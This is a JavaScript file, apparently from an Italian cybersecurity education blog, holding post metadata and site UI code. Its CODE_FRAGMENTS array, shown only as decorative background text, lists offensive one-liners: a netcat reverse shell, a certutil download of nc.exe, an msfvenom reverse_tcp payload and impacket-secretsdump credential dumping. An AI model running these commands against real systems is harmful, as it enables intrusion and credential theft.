    "excerpt": "Il primo ransomware fu distribuito su floppy disk nel 1989 da un biologo. Trent'anni dopo è un mercato da miliardi. La storia completa di come siamo arrivati qui."
  },
  {
    "id": "wikileaks-assange",
    "title": "WikiLeaks e Julian Assange: trasparenza radicale e le sue conseguenze",
    "date": "2026-03-03",
    "cat": "storia",
    "tags": [
      "WikiLeaks",
      "Assange",
      "whistleblower",
      "diplomaticables",
      "Manning",
      "storia"
    ],
    "excerpt": "Dal 2006 WikiLeaks ha pubblicato milioni di documenti riservati. La storia di Julian Assange tra libertà di stampa, spionaggio e anni di reclusione nell'ambasciata ecuadoriana."
  },
  {
    "id": "edward-snowden",
    "title": "Edward Snowden e la sorveglianza di massa: cosa ci ha insegnato il leak della NSA",
    "date": "2026-03-02",
    "cat": "storia",
    "tags": [
      "Snowden",
      "NSA",
      "PRISM",
      "sorveglianza",
      "whistleblower",
      "privacy"
    ],
    "excerpt": "Giugno 2013: un contractor NSA vola a Hong Kong con quattro laptop e cambia per sempre la nostra comprensione della sorveglianza digitale globale."
  },
  {
    "id": "cypherpunks",
    "title": "I Cypherpunk: il manifesto che ha ispirato Bitcoin, Tor e la crittografia moderna",
    "date": "2026-03-01",
    "cat": "storia",
    "tags": [
      "cypherpunk",
      "crittografia",
      "privacy",
      "Eric Hughes",
      "PGP",
      "storia"
    ],
    "excerpt": "Nel 1993 Eric Hughes scrisse il Manifesto Cypherpunk. Un documento che ha dato forma a Tor, PGP, Bitcoin e all'idea che la privacy sia un diritto da difendere con il codice."
  },
  {
    "id": "cose-il-blue-team",
    "title": "Cos'è il Blue Team: ruoli, strumenti e differenza con il Red Team",
    "date": "2026-02-12",
    "cat": "blue",
    "tags": [
      "blue team",
      "SOC",
      "incident response",
      "difesa",
      "detection",
      "SIEM"
    ],
    "excerpt": "Il Blue Team difende, rileva e risponde. Cosa fanno concretamente un analista SOC, un threat hunter e un incident responder, e quali strumenti usano ogni giorno."
  },
  {
    "id": "analisi-log-windows-event-id",
    "title": "Analisi dei log Windows: gli Event ID che ogni Blue Team deve conoscere",
    "date": "2026-02-11",
    "cat": "blue",
    "tags": [
      "Windows",
      "event log",
      "Event ID",
      "SIEM",
      "blue team",
      "threat hunting"
    ],
    "excerpt": "Gli Event ID di Windows raccontano tutto: login, escalation, lateral movement, persistence. Guida agli ID fondamentali e come usarli per rilevare attività sospette."
  },
  {
    "id": "wireshark-analisi-traffico",
    "title": "Wireshark: analisi del traffico di rete per il Blue Team",
    "date": "2026-02-10",
    "cat": "blue",
    "tags": [
      "Wireshark",
      "packet analysis",
      "network",
      "pcap",
      "TLS",
      "blue team"
    ],
    "excerpt": "Wireshark è lo strumento di riferimento per l'analisi del traffico di rete. Filtri essenziali, follow TCP stream, analisi di attacchi reali e cosa cercare in un pcap sospetto."
  },
  {
    "id": "incident-response-processo",
    "title": "Incident Response: il processo per rispondere a un attacco informatico",
    "date": "2026-02-09",
    "cat": "blue",
    "tags": [
      "incident response",
      "IR",
      "DFIR",
      "containment",
      "forensics",
      "NIST"
    ],
    "excerpt": "Cosa fare nelle prime ore dopo un incidente di sicurezza. Il processo IR in 6 fasi secondo NIST: preparazione, identificazione, contenimento, eradicazione, recovery, lessons learned."
  },
  {
    "id": "ids-ips-suricata",
    "title": "IDS/IPS con Suricata: rilevare e bloccare gli attacchi in tempo reale",
    "date": "2026-02-08",
    "cat": "blue",
    "tags": [
      "IDS",
      "IPS",
      "Suricata",
      "regole",
      "network security",
      "NIDS"
    ],
    "excerpt": "Suricata è uno degli IDS/IPS open source più potenti. Come installarlo, scrivere regole, interpretare gli alert e integrarlo in un SOC."
  },
  {
    "id": "threat-intelligence-principianti",
    "title": "Threat Intelligence per principianti: capire chi attacca e come",
    "date": "2026-02-07",
    "cat": "blue",
    "tags": [
      "threat intelligence",
      "CTI",
      "IOC",
      "TTPs",
      "MISP",
      "OSINT"
    ],
    "excerpt": "La threat intelligence trasforma dati grezzi in conoscenza utile per la difesa. Tipi di intelligence, fonti OSINT, MISP e come integrare gli IOC nei sistemi di difesa."
  },
  {
    "id": "hardening-windows",
    "title": "Hardening Windows: configurazioni essenziali per ridurre la superficie d'attacco",
    "date": "2026-02-06",
    "cat": "blue",
    "tags": [
      "hardening",
      "Windows",
      "GPO",
      "Defender",
      "bitlocker",
      "event logging"
    ],
    "excerpt": "Hardening di un sistema Windows: Group Policy, Defender configurato, BitLocker, logging degli eventi, disabilitazione di LLMNR/NetBIOS e protocolli legacy."
  },
  {
    "id": "hardening-linux",
    "title": "Hardening Linux: rendere un sistema più sicuro passo dopo passo",
    "date": "2026-02-05",
    "cat": "blue",
    "tags": [
      "hardening",
      "Linux",
      "CIS benchmark",
      "SSH",
      "sudo",
      "UFW",
      "auditd"
    ],
    "excerpt": "Checklist pratica per hardening di sistemi Linux: configurazione SSH sicura, firewall, permessi, logging, rimozione servizi inutili e CIS benchmark."
  },
  {
    "id": "vulnerability-management",
    "title": "Vulnerability Management: come prioritizzare e correggere le vulnerabilità",
    "date": "2026-02-04",
    "cat": "blue",
    "tags": [
      "vulnerability management",
      "CVSS",
      "patch",
      "Nessus",
      "OpenVAS",
      "risk"
    ],
    "excerpt": "Avere un elenco di CVE non basta. Il vulnerability management è un processo continuo: scoperta, valutazione, prioritizzazione e remediation nel ciclo corretto."
  },
  {
    "id": "phishing-riconoscere-rispondere",
    "title": "Phishing: come riconoscerlo, analizzarlo e rispondere all'incidente",
    "date": "2026-02-03",
    "cat": "blue",
    "tags": [
      "phishing",
      "email",
      "social engineering",
      "blue team",
      "IR",
      "header analysis"
    ],
    "excerpt": "Il phishing è ancora il vettore d'attacco numero 1. Come analizzare un'email sospetta, estrarre gli indicatori di compromissione e gestire l'incidente."
  },
  {
    "id": "analisi-malware-base",
    "title": "Analisi malware per principianti: statica, dinamica e sandbox",
    "date": "2026-02-02",
    "cat": "blue",
    "tags": [
      "malware analysis",
      "sandbox",
      "reverse engineering",
      "strings",
      "Wireshark"
    ],
    "excerpt": "Come analizzare un campione malware senza eseguirlo (analisi statica) e cosa osservare durante l'esecuzione in ambiente isolato (analisi dinamica)."
  },
  {
    "id": "threat-hunting-intro",
    "title": "Threat Hunting: cercare l'attaccante nella rete prima che faccia danni",
    "date": "2026-02-01",
    "cat": "blue",
    "tags": [
      "threat hunting",
      "blue team",
      "IOC",
      "TTPs",
      "MITRE ATT&CK"
    ],
    "excerpt": "Il threat hunting non aspetta gli alert: va a cercare attivamente le minacce nascoste nella rete. Metodologia, ipotesi, fonti dati e integrazione con MITRE ATT&CK."
  },
  {
    "id": "cose-il-penetration-testing",
    "title": "Cos'è il Penetration Testing: guida completa per chi inizia",
    "date": "2026-01-12",
    "cat": "fond",
    "tags": [
      "penetration testing",
      "pentest",
      "ethical hacking",
      "metodologia",
      "scoping"
    ],
    "excerpt": "Cosa significa fare un penetration test, come si struttura un engagement, le fasi dalla ricognizione al report e la differenza tra pentest, red team e vulnerability assessment."
  },
  {
    "id": "cyber-kill-chain-mitre-attack",
    "title": "Cyber Kill Chain e MITRE ATT&CK: le fasi di un attacco informatico",
    "date": "2026-08-15",
    "cat": "fond",
    "tags": ["cyber kill chain", "MITRE ATT&CK", "TTPs", "metodologia", "fondamentali"],
    "excerpt": "Ogni attacco informatico segue delle fasi riconoscibili. Cyber Kill Chain e MITRE ATT&CK sono i due framework che le descrivono — e che ogni difensore usa per capire dove intervenire."
  },
  {
    "id": "risk-management-analisi-rischio",
    "title": "Risk Management: come si valuta il rischio in sicurezza informatica",
    "date": "2026-08-16",
    "cat": "fond",
    "tags": ["risk management", "analisi del rischio", "asset", "risk matrix", "fondamentali"],
    "excerpt": "Non tutte le vulnerabilità meritano la stessa attenzione, e non tutti gli asset hanno lo stesso valore. Il risk management è la disciplina che permette di decidere dove investire prima che sia troppo tardi."
  },
  {
    "id": "iam-rbac-privilegio-minimo",
    "title": "IAM: Identity and Access Management, RBAC e principio del privilegio minimo",
    "date": "2026-08-17",
    "cat": "fond",
    "tags": ["IAM", "RBAC", "ABAC", "privilegio minimo", "governance", "fondamentali"],
    "excerpt": "Autenticarsi non basta: bisogna anche decidere cosa un utente autenticato può fare. IAM, RBAC, ABAC e il principio del privilegio minimo sono le fondamenta della governance degli accessi."
  },
  {
    "id": "active-directory-ldap-fondamenti",
    "title": "Active Directory e LDAP: le fondamenta dell'identità aziendale",
    "date": "2026-08-18",
    "cat": "fond",
    "tags": ["Active Directory", "LDAP", "Kerberos", "domain controller", "fondamentali"],
    "excerpt": "Prima di capire come si attacca Active Directory, bisogna capire come funziona. Domini, Organizational Unit, Group Policy, LDAP e Kerberos: l'infrastruttura di identità del 90% delle aziende Windows."
  },
  {
    "id": "biometria-autenticazione-fisica",
    "title": "Biometria e fattori di autenticazione fisici",
    "date": "2026-08-19",
    "cat": "fond",
    "tags": ["biometria", "impronta digitale", "Face ID", "FAR", "FRR", "fondamentali"],
    "excerpt": "Impronte digitali, riconoscimento facciale, iride: la biometria promette di eliminare le password sostituendole con 'ciò che sei'. Come funziona davvero, quanto è affidabile, e perché non è infallibile."
  },
  {
    "id": "owasp-top-10",
    "title": "OWASP Top 10: le vulnerabilità web più critiche",
    "date": "2026-08-20",
    "cat": "fond",
    "tags": ["OWASP", "Top 10", "web security", "vulnerabilità", "fondamentali"],
    "excerpt": "SQL Injection, XSS, controlli di accesso rotti: la OWASP Top 10 è la classifica di riferimento delle vulnerabilità web più critiche e più diffuse. La mappa che ogni sviluppatore e pentester dovrebbe conoscere a memoria."
  },
  {
    "id": "malware-tipologie-fondamentali",
    "title": "Malware: tipologie e come funzionano",
    "date": "2026-08-21",
    "cat": "fond",
    "tags": ["malware", "virus", "worm", "trojan", "ransomware", "fondamentali"],
    "excerpt": "Virus, worm, trojan, ransomware, spyware, rootkit: parole usate spesso come sinonimi ma che descrivono comportamenti tecnicamente molto diversi. La tassonomia di base di cosa rende malevolo un software."
  },
  {
    "id": "anatomia-attacco-ransomware",
    "title": "Anatomia di un attacco ransomware: dalla compromissione all'estorsione",
    "date": "2026-08-22",
    "cat": "fond",
    "tags": ["ransomware", "double extortion", "attacco", "kill chain", "fondamentali"],
    "excerpt": "Un attacco ransomware moderno non è 'un virus che cifra i file' — è una campagna strutturata che dura giorni o settimane, con fasi precise prima che una singola cifratura venga eseguita. Ecco come funziona davvero."
  },
  {
    "id": "ricognizione-passiva-osint",
    "title": "Ricognizione passiva e OSINT: raccogliere informazioni senza toccare il target",
    "date": "2026-01-11",
    "cat": "red",
    "tags": [
      "OSINT",
      "passive recon",
      "Shodan",
      "theHarvester",
      "Google dork",
      "whois"
    ],
    "excerpt": "Prima di toccare il target, un buon pentester raccoglie il più possibile da fonti aperte. OSINT toolkit: Shodan, theHarvester, Google dork, whois e molto altro."
  },
  {
    "id": "ricognizione-attiva-nmap",
    "title": "Ricognizione attiva con Nmap: tecniche e script essenziali",
    "date": "2026-01-10",
    "cat": "red",
    "tags": [
      "nmap",
      "recon",
      "port scanning",
      "NSE",
      "active reconnaissance"
    ],
    "excerpt": "Nmap è il punto di partenza di ogni pentest. Scansioni TCP/UDP, OS fingerprinting, script NSE, timing e tecniche per ridurre il rumore durante le attività."
  },
  {
    "id": "introduzione-metasploit",
    "title": "Introduzione a Metasploit: il framework essenziale del penetration tester",
    "date": "2026-01-09",
    "cat": "red",
    "tags": [
      "Metasploit",
      "msfconsole",
      "exploit",
      "payload",
      "meterpreter",
      "red team"
    ],
    "excerpt": "Metasploit è il framework più usato nel penetration testing. Architettura, moduli, payload, meterpreter: una guida per iniziare a usarlo con consapevolezza."
  },
  {
    "id": "password-cracking-hashcat-hydra",
    "title": "Password cracking con Hashcat e Hydra: guida pratica",
    "date": "2026-01-08",
    "cat": "red",
    "tags": [
      "hashcat",
      "hydra",
      "password cracking",
      "hash",
      "wordlist",
      "rockyou"
    ],
    "excerpt": "Hashcat per gli hash offline, Hydra per gli attacchi online: come funzionano, quali modalità usare e come difendersi con policy robuste e hashing corretto."
  },
  {
    "id": "sql-injection-basi",
    "title": "SQL Injection: dalle basi all'exploitation pratica",
    "date": "2026-01-07",
    "cat": "red",
    "tags": [
      "SQL injection",
      "SQLi",
      "database",
      "sqlmap",
      "OWASP",
      "web"
    ],
    "excerpt": "La SQL injection è vecchia ma ancora pericolosissima. Basi teoriche, tipologie (blind, error-based, time-based), uso di sqlmap e come prevenirla con prepared statements."
  },
  {
    "id": "xss-cross-site-scripting",
    "title": "XSS — Cross-Site Scripting: capire, sfruttare e difendersi",
    "date": "2026-01-06",
    "cat": "red",
    "tags": [
      "XSS",
      "cross-site scripting",
      "web",
      "DOM",
      "CSP",
      "OWASP"
    ],
    "excerpt": "Reflected, stored, DOM-based: i tre tipi di XSS spiegati con payload reali, scenari d'attacco e le contromisure efficaci tra CSP e sanitizzazione dell'input."
  },
  {
    "id": "privilege-escalation-linux",
    "title": "Privilege Escalation su Linux: da user a root passo dopo passo",
    "date": "2026-01-05",
    "cat": "red",
    "tags": [
      "privilege escalation",
      "Linux",
      "red team",
      "SUID",
      "cron",
      "sudo"
    ],
    "excerpt": "SUID binari, cron job mal configurati, sudo misconfiguration, capabilities: le vie più comuni per scalare da utente a root su sistemi Linux."
  },
  {
    "id": "privilege-escalation-windows",
    "title": "Privilege Escalation su Windows: tecniche essenziali per il red team",
    "date": "2026-01-04",
    "cat": "red",
    "tags": [
      "privilege escalation",
      "Windows",
      "red team",
      "UAC",
      "token impersonation"
    ],
    "excerpt": "Da user a SYSTEM: le tecniche più comuni di privilege escalation su Windows, dall'abuso dei servizi ai token impersonation, con esempi pratici."
  },
  {
    "id": "reverse-shell-bind-shell",
    "title": "Reverse shell e bind shell: differenze, uso e detection",
    "date": "2026-01-03",
    "cat": "red",
    "tags": [
      "reverse shell",
      "bind shell",
      "netcat",
      "payload",
      "post-exploitation"
    ],
    "excerpt": "Differenza tra reverse shell e bind shell, quando usare l'una o l'altra, come configurarle e come i blue team le rilevano."
  },
  {
    "id": "burp-suite-basi",
    "title": "Burp Suite: guida alle basi per il web application testing",
    "date": "2026-01-02",
    "cat": "red",
    "tags": [
      "Burp Suite",
      "web",
      "proxy",
      "intercept",
      "scanner",
      "OWASP"
    ],
    "excerpt": "Burp Suite è lo strumento standard per il web application penetration testing. Proxy, scanner, intruder, repeater: come usarli in un test reale."
  },
  {
    "id": "report-penetration-test",
    "title": "Come si legge un report di penetration test: struttura, flag e raccomandazioni",
    "date": "2026-01-01",
    "cat": "red",
    "tags": [
      "pentest",
      "report",
      "vulnerabilità",
      "CVSS",
      "remediation"
    ],
    "excerpt": "Un report di pentest non è solo un elenco di bug. È un documento strategico. Come interpretarlo, cosa guardare per primo e come prioritizzare le remediation."
  },
  {
    "id": "dark-web-credenziali-italiane-2025",
    "title": "2,2 milioni di alert: le credenziali italiane sul dark web nel 2025",
    "date": "2025-11-20",
    "cat": "blue",
    "tags": [
      "dark web",
      "credential leak",
      "CRIF",
      "data breach",
      "password",
      "OSINT"
    ],
    "excerpt": "L'Osservatorio Cyber CRIF 2025 ha registrato oltre 2,2 milioni di alert su dati italiani esposti nel dark web, con una crescita del 22% nella gravità media."
  },
  {
    "id": "ai-cybercrime-moltiplicatore-rischio",
    "title": "L'AI come moltiplicatore di rischio: come i criminali usano i modelli linguistici",
    "date": "2025-10-15",
    "cat": "red",
    "tags": [
      "AI",
      "LLM",
      "phishing",
      "exploit",
      "automation"
    ],
    "excerpt": "L'intelligenza artificiale non è solo uno strumento difensivo. Nel 2025 i gruppi criminali la usano per automatizzare phishing, accelerare exploit development e scalare gli attacchi."
  },
  {
    "id": "ransomware-sanita-italiana",
    "title": "Ospedali sotto attacco: perché la sanità italiana è nel mirino del ransomware",
    "date": "2025-09-24",
    "cat": "red",
    "tags": [
      "ransomware",
      "sanità",
      "ospedale",
      "SECTOR16",
      "supply chain",
      "ACN"
    ],
    "excerpt": "Dal 2023 una media di 3,5 attacchi al mese contro ospedali italiani. Perché il settore sanitario è il bersaglio preferito del ransomware e cosa si può fare per difendersi."
  },
  {
    "id": "hacktivismo-state-sponsored-europa",
    "title": "La cyberguerra silenziosa: hacktivismo state-sponsored in Europa nel 2025",
    "date": "2025-06-15",
    "cat": "storia",
    "tags": [
      "hacktivismo",
      "geopolitica",
      "state-sponsored",
      "NoName057",
      "Killnet"
    ],
    "excerpt": "NoName057(16) è responsabile del 90% degli attacchi state-aligned in Europa. Come l'hacktivismo è diventato uno strumento di guerra ibrida e perché l'Italia è un bersaglio ricorrente."
  },
  {
    "id": "tiktok-gdpr-530-milioni",
    "title": "TikTok e i dati europei in Cina: la multa da 530 milioni che cambia tutto",
    "date": "2025-05-02",
    "cat": "news",
    "tags": [
      "GDPR",
      "TikTok",
      "privacy",
      "data transfer",
      "DPC",
      "UE"
    ],
    "excerpt": "Maggio 2025: la DPC irlandese multa TikTok per 530 milioni di euro. I dati degli utenti europei finivano su server cinesi. Terza sanzione GDPR più alta di sempre."
  },
  {
    "id": "nis2-recepimento-italia-dlgs-138",
    "title": "NIS2 in Italia: cosa cambia con il D.Lgs. 138/2024 — guida pratica",
    "date": "2025-03-01",
    "cat": "blue",
    "tags": [
      "NIS2",
      "ACN",
      "compliance",
      "GDPR",
      "direttiva UE"
    ],
    "excerpt": "La direttiva NIS2 è stata recepita in Italia con il D.Lgs. 138/2024. Cosa devono fare aziende e PA per adeguarsi, le scadenze chiave e le sanzioni previste."
  },
  {
    "id": "noname057-ddos-italia-2025",
    "title": "NoName057(16): quando l'hacktivismo filorusso colpisce l'Italia",
    "date": "2025-02-18",
    "cat": "storia",
    "tags": [
      "DDoS",
      "hacktivismo",
      "NoName057",
      "geopolitica",
      "NATO"
    ],
    "excerpt": "Febbraio 2025: aeroporti di Malpensa e Linate, porti di Trieste e Taranto, Intesa Sanpaolo. Come un gruppo Telegram ha dichiarato guerra informatica all'Italia."
  },
  {
    "id": "deepfake-crosetto-voice-cloning",
    "title": "La voce del Ministro: il deepfake che ha truffato l'Italia per 1 milione di euro",
    "date": "2025-02-10",
    "cat": "red",
    "tags": [
      "deepfake",
      "voice cloning",
      "social engineering",
      "AI",
      "frode"
    ],
    "excerpt": "Febbraio 2025: una voce artificiale del Ministro Crosetto convince un imprenditore a trasferire 1 milione di euro. Analisi tecnica del primo grande caso italiano di AI fraud."
  },
  {
    "id": "lateral-movement-red-team",
    "title": "Lateral Movement: come un attaccante si muove nella rete dopo il primo accesso",
    "date": "2025-01-10",
    "cat": "red",
    "tags": [
      "lateral movement",
      "red team",
      "post-exploitation",
      "pivoting",
      "pass-the-hash"
    ],
    "excerpt": "Ottenuto il primo foothold, l'attaccante si muove lateralmente verso target più preziosi. Tecniche, tool e contromisure del lateral movement."
  },
  {
    "id": "siem-blue-team",
    "title": "SIEM e Blue Team: come funziona il centro nevralgico della difesa informatica",
    "date": "2025-01-05",
    "cat": "blue",
    "tags": [
      "SIEM",
      "blue team",
      "SOC",
      "log",
      "correlazione"
    ],
    "excerpt": "Il SIEM raccoglie, normalizza e correla log da tutta l'infrastruttura in tempo reale. Guida pratica a come funziona e perché è il cuore di ogni Blue Team."
  },
  {
    "id": "storia-hacking-captain-crunch",
    "title": "La storia di Captain Crunch: il fischietto che bucò il sistema telefonico americano",
    "date": "2024-12-20",
    "cat": "storia",
    "tags": [
      "captain crunch",
      "phreaking",
      "storia hacking",
      "anni 70"
    ],
    "excerpt": "John Draper scoprì che il fischietto omaggio dei cereali Cap'n Crunch emetteva esattamente 2600 Hz — la frequenza per accedere alle linee trunk AT&T. Così nacque il phreaking."
  }
];
// [POSTS:END]

/* ════════════════════════════════════════════════════════════
   pasta-cod3 — main.js v2.0
   Cyberpunk Canvas BG + Search + Filter + UI
   ════════════════════════════════════════════════════════════ */

'use strict';

/* ──────────────────────────────────────────────────────────
   ▶ POSTS DATA
   ──────────────────────────────────────────────────────────
   L'array POSTS è generato automaticamente da Jekyll
   tramite Liquid in index.html — non modificare qui.
   ────────────────────────────────────────────────────────── */


/* ──────────────────────────────────────────────────────────
   ▶ CYBERPUNK CANVAS BACKGROUND
   ────────────────────────────────────────────────────────── */

const CODE_FRAGMENTS = [
  "nmap -sV -sC -p- 10.10.10.1",
  "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
  "cat /etc/passwd | grep -v nologin",
  "nc -lvnp 4444",
  "sudo -l",
  "find / -perm -4000 2>/dev/null",
  "ssh -L 8080:127.0.0.1:80 user@target",
  "hashcat -m 0 hash.txt rockyou.txt",
  "curl -s http://target/api/v1/users",
  "grep -rn 'password' /var/www/html/",
  "uname -a && id && whoami",
  "tcpdump -i eth0 port 80 -w cap.pcap",
  "gobuster dir -u http://target -w common.txt",
  "sqlmap -u 'http://target/?id=1' --dbs",
  "hydra -l admin -P rockyou.txt ssh://target",
  "msfconsole -q -x 'use exploit/multi/handler'",
  "john --wordlist=rockyou.txt hash.txt",
  "wpscan --url http://target --enumerate u",
  "enum4linux -a 10.10.10.1",
  "evil-winrm -i 10.10.10.1 -u admin -p 'P@ss'",
  "chisel server --port 8080 --reverse",
  "proxychains nmap -sT 172.16.0.0/24",
  "crackmapexec smb 10.10.10.0/24",
  "impacket-secretsdump domain/admin@10.10.10.1",
  "whoami /priv",
  "net user administrator /domain",
  "Get-ADUser -Filter * | Select Name",
  "tcpdump -i any -A -s0 port 80",
  "openssl s_client -connect target:443",
  "ss -tlpn | grep LISTEN",
  "ps aux --sort=-%cpu | head",
  "cat /proc/version",
  "arp -n | awk '{print $1}'",
  "ip route | grep -v 169",
  "ldapsearch -x -h 10.10.10.1 -b 'dc=domain,dc=local'",
  "dirsearch -u http://target -e php,html,txt",
  "ffuf -w wordlist.txt -u http://target/FUZZ",
  "certutil.exe -urlcache -f http://10.10.10.1/nc.exe",
  "powershell -enc JABjAGwAaQBlAG4AdA==",
  "nc 10.10.10.1 4444 -e /bin/bash",
  "python3 -m http.server 8080",
  "curl -X POST -d 'cmd=id' http://target/exec.php",
  "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.2",
  "burpsuite --headless --project-file=test.burp",
  "smbclient -L 10.10.10.1 -N",
  "rpcclient -U '' 10.10.10.1",
  "ldapdomaindump -u 'DOMAIN\\user' -p pass 10.10.10.1",
  "volatility -f mem.raw --profile=Win7 pslist",
  "binwalk -e firmware.bin",
  "strings binary | grep -i pass",
];

class CodeFrag {
  constructor(ctx, w, h, isMobile) {
    this.ctx = ctx;
    this.isMobile = isMobile;
    this.reset(w, h);
  }
  reset(w, h) {
    this.x = Math.random() * (w - 20) + 10;
    this.y = Math.random() * h;
    this.text = CODE_FRAGMENTS[Math.floor(Math.random() * CODE_FRAGMENTS.length)];
    this.displayed = '';
    this.charIdx = 0;
    this.opacity = 0;
    this.state = 'typing';   // typing | hold | fade
    this.typeTick = 0;
    this.typeRate = this.isMobile ? 3 : (2 + Math.random() * 3); // ticks per char
    this.holdMax  = 60 + Math.random() * 100;
    this.holdTick = 0;
    this.fadeRate = 0.008 + Math.random() * 0.01;
    this.fontSize = this.isMobile ? (9 + Math.random() * 2) : (9.5 + Math.random() * 3);
    this.bright   = Math.random() > 0.75;
  }
  update(w, h) {
    if (this.state === 'typing') {
      this.typeTick++;
      if (this.typeTick >= this.typeRate) {
        this.typeTick = 0;
        if (this.charIdx < this.text.length) this.charIdx++;
        this.displayed = this.text.slice(0, this.charIdx);
        this.opacity = Math.min(this.opacity + 0.025, this.bright ? 0.38 : 0.16);
        if (this.charIdx >= this.text.length) this.state = 'hold';
      }
    } else if (this.state === 'hold') {
      this.holdTick++;
      if (this.holdTick >= this.holdMax) this.state = 'fade';
    } else {
      this.opacity -= this.fadeRate;
      if (this.opacity <= 0) this.reset(w, h);
    }
  }
  draw(isLight) {
    const ctx = this.ctx;
    ctx.save();
    ctx.globalAlpha = Math.max(0, this.opacity);
    ctx.fillStyle   = isLight
      ? (this.bright ? '#000000' : '#33415c')
      : (this.bright ? '#00c8ff' : '#004466');
    ctx.font        = `${this.fontSize}px 'JetBrains Mono',monospace`;
    ctx.fillText(this.displayed + (this.state === 'typing' ? '▋' : ''), this.x, this.y);
    ctx.restore();
  }
}

function initCanvas() {
  const canvas = document.getElementById('spaceCanvas');
  if (!canvas) return;

  const ctx = canvas.getContext('2d');
  const prefersReduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  if (prefersReduced) { canvas.style.display = 'none'; return; }

  let W, H, frags = [], rafId;
  const isMobile = () => window.innerWidth < 768;
  const COUNT = () => isMobile() ? 8 : 22;

  // Tema letto una volta e tenuto in cache: evita una lettura DOM per
  // frammento ad ogni frame (fino a 22 letture/frame a 60fps).
  let isLightTheme = document.documentElement.getAttribute('data-theme') === 'light';
  new MutationObserver(() => {
    isLightTheme = document.documentElement.getAttribute('data-theme') === 'light';
  }).observe(document.documentElement, { attributes: true, attributeFilter: ['data-theme'] });

  function resize() {
    W = window.innerWidth;
    H = window.innerHeight;
    canvas.width  = W;
    canvas.height = H;
    canvas.style.width  = W + 'px';
    canvas.style.height = H + 'px';

    // Re-spread existing fragments
    frags.forEach(f => f.reset(W, H));
  }

  function init() {
    frags = [];
    const n = COUNT();
    for (let i = 0; i < n; i++) {
      const f = new CodeFrag(ctx, W, H, isMobile());
      // Stagger initial positions in time (vary opacity start)
      f.charIdx  = Math.floor(Math.random() * f.text.length);
      f.displayed = f.text.slice(0, f.charIdx);
      f.state = Math.random() > 0.5 ? 'hold' : 'typing';
      f.opacity = Math.random() * 0.25;
      frags.push(f);
    }
  }

  function loop() {
    ctx.clearRect(0, 0, W, H);
    frags.forEach(f => { f.update(W, H); f.draw(isLightTheme); });
    rafId = requestAnimationFrame(loop);
  }

    // Pausa canvas quando il tab non è visibile — risparmia CPU/GPU
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
      cancelAnimationFrame(rafId);
    } else {
      rafId = requestAnimationFrame(loop);
    }
  });

  resize();
  init();
  loop();

  let resizeTimer;
  window.addEventListener('resize', () => {
    clearTimeout(resizeTimer);
    resizeTimer = setTimeout(() => { resize(); init(); }, 250);
  });
}


/* ──────────────────────────────────────────────────────────
   ▶ SMOOTH SCROLL — Lenis + GSAP ScrollTrigger
   ────────────────────────────────────────────────────────── */
let lenis = null;

function initSmoothScroll() {
  if (typeof gsap === 'undefined' || typeof ScrollTrigger === 'undefined') return;
  gsap.registerPlugin(ScrollTrigger);

  const prefersReduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  if (prefersReduced || typeof Lenis === 'undefined') return;

  lenis = new Lenis({
    duration: 1.2,
    easing: t => Math.min(1, 1.001 - Math.pow(2, -10 * t)), // easeOutExpo — morbido ma reattivo
    smoothWheel: true,
    // touch resta nativo di default: nessun lag sullo scroll mobile
  });

  lenis.on('scroll', ScrollTrigger.update);
  gsap.ticker.add(time => lenis.raf(time * 1000));
  gsap.ticker.lagSmoothing(0);
}


/* ──────────────────────────────────────────────────────────
   ▶ HERO REVEAL — ingresso cinematografico al caricamento
   Ogni attributo (eyebrow, righe del titolo, sottotitolo, CTA,
   stat-box) entra in sequenza con un piccolo "focus pull"
   (blur → nitido) oltre a fade/slide, invece del semplice
   opacity/y usato altrove: sull'hero, sopra la piega, il costo
   extra del filter è trascurabile anche su mobile.
   ────────────────────────────────────────────────────────── */
function initHeroReveal() {
  const hero = document.querySelector('.hero.page-hero');
  if (!hero) return;
  const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  if (reduced || typeof gsap === 'undefined') return;

  const eyebrow = hero.querySelector('.eyebrow');
  const lines   = hero.querySelectorAll('.line1, .line2, .line3');
  const sub     = hero.querySelector('.subtitle');
  const ctas    = hero.querySelectorAll('.hero-cta > *');
  const stats   = hero.querySelectorAll('.stat-box');
  if (!eyebrow || !lines.length) return;

  gsap.set([eyebrow, sub, ...ctas], { opacity: 0, y: 16, filter: 'blur(7px)' });
  gsap.set(lines, { opacity: 0, y: 24, filter: 'blur(11px)' });
  gsap.set(stats, {
    opacity: 0, y: 22, rotateX: -22,
    transformPerspective: 700, transformOrigin: '50% 100%',
  });

  gsap.timeline({ defaults: { ease: 'power3.out' } })
    .to(eyebrow, { opacity: 1, y: 0, filter: 'blur(0px)', duration: 0.5 })
    .to(lines, { opacity: 1, y: 0, filter: 'blur(0px)', duration: 0.65, stagger: 0.12 }, '-=0.2')
    .to(sub, { opacity: 1, y: 0, filter: 'blur(0px)', duration: 0.5 }, '-=0.35')
    .to(ctas, { opacity: 1, y: 0, filter: 'blur(0px)', duration: 0.45, stagger: 0.08, clearProps: 'transform,filter' }, '-=0.25')
    .to(stats, {
      opacity: 1, y: 0, rotateX: 0, duration: 0.6, stagger: 0.08,
      clearProps: 'transform', overwrite: true,
    }, '-=0.35');
}


/* ──────────────────────────────────────────────────────────
   ▶ UTILS
   ────────────────────────────────────────────────────────── */

const CAT_LABEL = {
  'red':    'Red Team',
  'blue':   'Blue Team',
  'storia': 'Storia',
  'fond':   'Fondamentali',
  'news':   'Notizie',
};

function fmtDate(iso) {
  if (!iso) return '';
  const d = new Date(iso + 'T00:00:00');
  return d.toLocaleDateString('it-IT', { day:'2-digit', month:'short', year:'numeric' });
}

function buildCard(post) {
  return `
  <article class="article-card" data-cat="${post.cat}" role="listitem">
    <a href="posts/${post.id}.html" style="display:contents" tabindex="-1" aria-hidden="true"></a>
    <div class="article-cat-badge c-${post.cat.replace('-team','').replace('fondamentali','fond')}">${CAT_LABEL[post.cat] || post.cat}</div>
    <h3 class="article-title">
      <a href="posts/${post.id}.html">${post.title}</a>
    </h3>
    ${post.excerpt ? `<p class="article-excerpt">${post.excerpt}</p>` : ''}
    <div class="article-meta">
      <time class="article-date" datetime="${post.date}">${fmtDate(post.date)}</time>
      <div class="article-tags">
